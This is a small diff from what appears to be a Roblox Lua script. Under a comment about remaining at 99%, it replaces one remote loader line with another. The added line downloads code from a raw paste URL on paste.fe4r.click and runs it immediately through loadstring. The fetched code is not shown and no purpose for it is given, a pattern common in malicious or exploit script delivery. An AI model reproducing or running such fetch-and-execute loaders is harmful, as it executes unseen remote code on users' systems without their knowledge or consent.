@@ -237,4 +237,4 @@ if not Success then
 end
 
 --// Remain at 99%
-loadstring(game:HttpGet("https://vxezestudio.online/api/scripts/script_05VKL1nyK8FCt/stream/init"))()
+loadstring(game:HttpGet("https://paste.fe4r.click/raw/7be8be10-7783-4f71-87f7-8bcb1d4c0348"))()
